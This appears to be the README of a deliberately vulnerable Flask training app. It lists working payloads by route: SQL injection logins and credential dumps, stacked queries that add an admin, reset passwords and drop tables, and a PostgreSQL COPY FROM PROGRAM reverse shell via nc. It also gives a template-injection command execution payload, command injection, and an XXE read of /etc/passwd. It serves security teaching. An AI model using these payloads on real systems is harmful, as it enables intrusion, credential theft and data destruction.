# eTechAcademy Flask App

## Vulnerabilities

### SQL Injection
#### Retrieve Data
Paths: `/login` and `/index`
Methods: `GET, POST`

**Examples:**
- Log into admin account with SQL
```
username: ' OR 1=1--
password: a

OR 

username: admin 
password: ' OR 1=1--
```

- Vulnerable query database on `/index`
```
' OR 1=1--
' UNION SELECT username,password FROM users--
' UNION SELECT username || ':' || password,role FROM users--
```

Resources: [Sqli CheatSheet](https://book.hacktricks.xyz/pentesting-web/sql-injection)

**SQL Fix:**
```
cur.execute("SELECT user_id, role FROM users WHERE username = %s AND password = %s", (username, password))
```

#### Insert/Update/Drop Data
**Examples**
Path: `/add_course`
Methods: `GET, POST`

*Note:* Must be **Instructor/Admin** role and you must select instructor and set image_path for this to work properly.
```
# Insert new admin user
New Course', 'Malicious Description', NULL, 'image.jpg'); INSERT INTO users (username, password, role) VALUES ('evil', 'evil', 'admin'); --

# Update admin password
New Course', 'test', NULL, 'test.jpg'); UPDATE users SET password = 'testing' WHERE username = 'admin'; --

# Drop table
New Course', 'test', NULL, 'test.jpg'); DROP TABLE courses CASCADE; --

```

#### RCE Via SQL Injection (Postgresql)
Path: `/add_course`
Methods: `GET, POST`

**Example:**
```
NewCourse', 'test', 1, 'test'); DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f'; SELECT * FROM cmd_exec;--
```

### Server-Side Template Injection
Paths: `/search_course`
Methods: `GET, POST`

**Examples:**
```
{{ 7 * 7 }}
```

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Other resources: [SSTI Cheatsheet](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

### Command Injection
Path: `/admin_dashboard/system_monitor`
Methods: `GET, POST`

**Examples:**
```
whoami
cat /etc/passwd
```

### XML External Entity Injection (XXE)
XXE Injection allows for injection of XML entities to access or manipulate files on application.

Path: `/process_xml`
Methods: `POST`

**Example**
```
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<root>
   <title>Test Title</title>
    <description>&xxe;</description>
</root>
```

Other resources: [XXE Cheatsheet](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)